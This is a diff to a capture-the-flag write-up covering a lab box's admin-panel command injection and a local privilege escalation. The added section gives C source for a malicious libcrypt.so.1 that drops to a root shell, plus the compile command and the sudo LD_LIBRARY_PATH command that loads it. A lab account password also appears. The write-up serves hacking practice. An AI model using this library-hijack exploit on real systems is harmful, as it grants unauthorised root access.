@@ -148,7 +148,7 @@ Cool let us access the administrator panel
 
 That claims to do a service check on the provided service name
 
-I put `apache` since that's currently running and it works
+I put `apache2` since that's currently running and it works
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f6434c93-9c0e-4937-a940-31016f972937)
 
 This tells us that it is likely running a bash command with our argument provided
@@ -183,6 +183,49 @@ Using the password worked for user `rick` and we can now grab the user flag
 rick:N3v3rG0nn4G1v3Y0uUp
 ```
 
+Time for privilege escalation 
 
+Checking sudo permission shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/12d68db3-14e6-475b-8f8d-56d282a75a9b)
 
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc9766c7-0691-4712-b222-8c1f12bf0e5b)
+So we can run `/usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2` as `root` 
+
+But one interesting configuration is that we can specify the environment LD Library Path 
+
+We can get the list of library going to be called when the run the `apache2` binary using `ldd` 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f84960a7-82f5-4c81-b9ef-3c72f9282517)
+
+Simple google search should lead you at least [here](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/):
+
+In this case I'll hijack the library which is `libcrypt.so.1` 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38e06c23-5d74-412a-9dc0-4f67e35083d2)
+
+Here's the C code:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+To compile run this:
+
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC pwn.c
+```
+
+Now we can spawn a root shell 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/43fbbb4c-f2a9-4ed5-96cb-8542e63467cb)
+
+```
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
+
+That's all xD
